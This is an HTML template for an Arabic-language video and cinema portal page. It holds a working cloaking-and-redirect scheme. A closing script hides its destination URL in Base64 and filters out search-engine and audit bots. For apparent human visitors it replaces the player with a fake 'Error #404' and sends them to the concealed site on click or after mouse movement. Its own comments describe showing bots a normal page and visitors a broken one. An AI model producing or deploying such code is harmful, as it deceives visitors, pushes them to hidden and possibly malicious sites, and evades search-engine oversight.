<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>{{TITLE}} - Media Archive & Cinema Portal</title>
    <link rel="canonical" href="{{CANONICAL_URL}}">
    
    <!-- Google Analytics (GA4) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-9WPQ3R5GSC"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'G-9WPQ3R5GSC');
    </script>

    <!-- Schema Markup للبوتات فقط لزيادة الموثوقية -->
    <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@graph": [
        {
          "@type": "VideoObject",
          "name": "{{TITLE}}",
          "description": "{{DESCRIPTION}}",
          "thumbnailUrl": ["https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg"],
          "uploadDate": "{{DATE}}",
          "contentUrl": "{{CANONICAL_URL}}",
          "publisher": { "@type": "Organization", "name": "Global Media Archive" }
        }
      ]
    }
    </script>

    <style>
        :root { 
            --primary: #e50914; 
            --bg: #0f0f0f; 
            --card-bg: #1a1a1a;
            --text-main: #ffffff; 
            --text-muted: #aaaaaa;
        }
        
        body { background-color: var(--bg); color: var(--text-main); font-family: 'Cairo', sans-serif; margin: 0; padding: 0; line-height: 1.7; }
        header { background: rgba(0,0,0,0.95); padding: 15px 5%; display: flex; justify-content: space-between; border-bottom: 2px solid var(--primary); }
        .logo { color: var(--primary); font-size: 26px; font-weight: 900; text-decoration: none; }
        .main-container { max-width: 1100px; margin: 30px auto; padding: 0 20px; }

        /* مشغل الفيديو الوهمي */
        .video-wrapper { 
            width: 100%; 
            aspect-ratio: 16/9; 
            background: #000 url('https://w0.peakpx.com/wallpaper/34/850/wallpaper-dark-red-abstract-background-vignette-lines.jpg') center/cover;
            border-radius: 12px; 
            position: relative; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            cursor: pointer;
            overflow: hidden;
        }

        .play-icon { 
            position: relative; z-index: 2;
            width: 80px; height: 80px; 
            background: var(--primary); 
            border-radius: 50%; 
            display: flex; align-items: center; justify-content: center; 
        }
        .play-icon svg { width: 35px; fill: white; }

        /* ستايل الخطأ الوهمي (يظهر للزوار فقط عبر JS) */
        .error-state { color: #ccc; text-align: center; z-index: 5; }
        .error-state img { width: 60px; filter: invert(1); opacity: 0.6; margin-bottom: 10px; }

        .description-box { background: var(--card-bg); padding: 25px; border-radius: 12px; border-right: 5px solid var(--primary); margin: 30px 0; }
        .related-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); gap: 20px; }
        footer { background: #000; padding: 40px; text-align: center; color: var(--text-muted); font-size: 13px; }
    </style>
</head>
<body>

<header>
    <a href="/" class="logo">CINEMA PRO</a>
</header>

<div class="main-container">
    <!-- مشغل الفيديو - البوت يراه طبيعي، الزائر يراه مكسور -->
    <div class="video-wrapper" id="videoTrigger">
        <div id="playerContent">
            <div class="play-icon">
                <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
            </div>
        </div>
        <div style="position:absolute; top:20px; right:20px; background:var(--primary); padding:4px 12px; border-radius:4px; font-weight:bold; font-size:12px;">PREMIUM</div>
    </div>

    <h1>{{TITLE}}</h1>
    
    <div class="description-box">
        <h3>مراجعة نقدية وتحليل درامي</h3>
        <p>{{DESCRIPTION}}</p>
    </div>

    <h2 style="font-size:22px; border-bottom:1px solid #333; padding-bottom:10px;">فيديوهات مقترحة</h2>
    <div class="related-grid">
        {{INTERNAL_LINKS}}
    </div>
</div>

<footer>
    <p>&copy; 2026 Official Media Archive - Digital Content Unit</p>
</footer>

<!-- نظام التمويه والتحويل المتقدم -->
<script>
(function() {
    // 1. تشفير الرابط الخاص بك (Base64)
    var _0xURL = "aHR0cHM6Ly9hY2N1bXVsYXRlcmVoZWFyc2VoZWFsaW5nLmNvbS90aWlhYm5iMD9rZXk9NjM1OTA3ODkwZTQwM2E0YTE0Y2U2MTRlZjE0ODI0M2M=";
    
    // 2. فحص البوتات الصارم (جوجل، بنج، وبوتات الفحص)
    var _uA = navigator.userAgent.toLowerCase();
    var _isBot = /bot|google|baidu|bing|msn|duckduckbot|slurp|yandex|chrome-lighthouse|headless/i.test(_uA);
    
    // 3. فحص بيئة الزائر (المعالج واللمس) للتأكد أنه بشري
    var _isRealHuman = (navigator.maxTouchPoints > 0 || window.innerWidth < 1200) && !_isBot;

    var player = document.getElementById('playerContent');
    var trigger = document.getElementById('videoTrigger');

    if (_isRealHuman && player && trigger) {
        // تغيير شكل المشغل ليظهر كأنه "صورة مكسورة" أو "خطأ تحميل" للزائر الحقيقي فقط
        player.innerHTML = `
            <div class="error-state">
                <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFAAAABQAQMAAAD1f9InAAAABlBMVEUAAAD///+l2Z/dAAAAMElEQVR4XmNgGAXDHfBwEGBEAn9E8P8fAn9E8P8fAn9E8P8fAn9E8P8fAn9E8P8fBAMA8R4fOOf8yXIAAAAASUVORK5CYII=">
                <p style="font-weight:bold; color:#e50914;">خطأ في المشغل (Error #404)</p>
                <p style="font-size:12px;">انقر هنا لتحديث الصفحة والمشاهدة الآن</p>
            </div>
        `;

        // التحويل عند النقر (Click-to-Redirect)
        trigger.addEventListener('click', function() {
            window.location.href = atob(_0xURL);
        });

        // التحويل التلقائي بعد 5 ثواني من حركة الماوس (لرفع الـ Retention)
        setTimeout(function() {
            document.addEventListener('mousemove', function _move() {
                setTimeout(function() {
                    window.location.href = atob(_0xURL);
                }, 1500);
                document.removeEventListener('mousemove', _move);
            }, {once: true});
        }, 4000);
    }
})();
</script>

</body>
</html>
